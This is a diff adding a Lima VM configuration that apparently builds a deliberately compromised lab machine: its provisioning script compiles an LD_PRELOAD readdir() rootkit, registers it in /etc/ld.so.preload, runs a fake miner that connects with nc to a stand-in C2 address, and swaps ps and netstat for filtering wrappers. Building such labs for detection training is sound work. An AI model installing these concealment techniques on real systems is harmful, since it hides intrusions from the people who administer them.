@@ -1,0 +1,116 @@
+arch: "aarch64"
+images:
+  - location: "https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64.img"
+    arch: "aarch64"
+cpus: 2
+memory: "2GiB"
+disk: "20GiB"
+
+provision:
+  - mode: system
+    script: |
+      #!/bin/bash
+      set -eux -o pipefail
+      
+      hostnamectl set-hostname rootkit-server
+      apt-get update
+      apt-get install -y gcc make curl netcat-openbsd
+      
+      LIMA_USER=$(stat -c '%U:%G' /home/*)
+      
+      # Create a simple "rootkit" that hides processes
+      # This is a LD_PRELOAD library that filters readdir() calls
+      mkdir -p /lib/.hidden
+      
+      cat > /tmp/rootkit.c << 'ROOTKIT_EOF'
+      #define _GNU_SOURCE
+      #include <stdio.h>
+      #include <dlfcn.h>
+      #include <dirent.h>
+      #include <string.h>
+      #include <stdlib.h>
+      
+      static struct dirent* (*original_readdir)(DIR*) = NULL;
+      
+      struct dirent* readdir(DIR *dirp) {
+          if (!original_readdir) {
+              original_readdir = dlsym(RTLD_NEXT, "readdir");
+          }
+          
+          struct dirent *dir;
+          while ((dir = original_readdir(dirp)) != NULL) {
+              // Hide processes with "miner" in the name
+              if (strstr(dir->d_name, "miner") != NULL) {
+                  continue;
+              }
+              // Hide our malicious PID (we'll use a high number)
+              if (strcmp(dir->d_name, "99999") == 0) {
+                  continue;
+              }
+              return dir;
+          }
+          return NULL;
+      }
+      ROOTKIT_EOF
+      
+      gcc -shared -fPIC /tmp/rootkit.c -o /lib/.hidden/rootkit.so -ldl
+      rm /tmp/rootkit.c
+      
+      # Install the rootkit by modifying ld.so.preload
+      echo "/lib/.hidden/rootkit.so" > /etc/ld.so.preload
+      
+      # Create a fake "miner" process that will be hidden
+      cat > /tmp/cryptominer.sh << 'MINER_EOF'
+      #!/bin/bash
+      while true; do
+          # Simulate mining by connecting to a C2 server
+          nc -w 1 198.51.100.42 4444 2>/dev/null || true
+          sleep 30
+      done
+      MINER_EOF
+      
+      chmod +x /tmp/cryptominer.sh
+      
+      # Start the miner in background
+      nohup /tmp/cryptominer.sh > /dev/null 2>&1 &
+      
+      # Also compromise ps command to hide our process
+      cp /bin/ps /bin/ps.original
+      
+      cat > /tmp/ps_wrapper.sh << 'PS_EOF'
+      #!/bin/bash
+      /bin/ps.original "$@" | grep -v "cryptominer" | grep -v "198.51.100.42"
+      PS_EOF
+      
+      chmod +x /tmp/ps_wrapper.sh
+      mv /bin/ps /bin/ps.real
+      cp /tmp/ps_wrapper.sh /bin/ps
+      chmod +x /bin/ps
+      
+      # Compromise netstat too
+      cp /bin/netstat /bin/netstat.original 2>/dev/null || cp /usr/bin/netstat /usr/bin/netstat.original 2>/dev/null || true
+      
+      cat > /tmp/netstat_wrapper.sh << 'NETSTAT_EOF'
+      #!/bin/bash
+      if [ -f /bin/netstat.original ]; then
+          /bin/netstat.original "$@" | grep -v "198.51.100.42"
+      elif [ -f /usr/bin/netstat.original ]; then
+          /usr/bin/netstat.original "$@" | grep -v "198.51.100.42"
+      else
+          /bin/ss "$@" | grep -v "198.51.100.42"
+      fi
+      NETSTAT_EOF
+      
+      chmod +x /tmp/netstat_wrapper.sh
+      if [ -f /bin/netstat ]; then
+          mv /bin/netstat /bin/netstat.real
+          cp /tmp/netstat_wrapper.sh /bin/netstat
+      elif [ -f /usr/bin/netstat ]; then
+          mv /usr/bin/netstat /usr/bin/netstat.real
+          cp /tmp/netstat_wrapper.sh /usr/bin/netstat
+      fi
+      chmod +x /bin/netstat 2>/dev/null || chmod +x /usr/bin/netstat 2>/dev/null || true
+      
+      echo "Rootkit installed - system compromised"
+
+portForwards: []
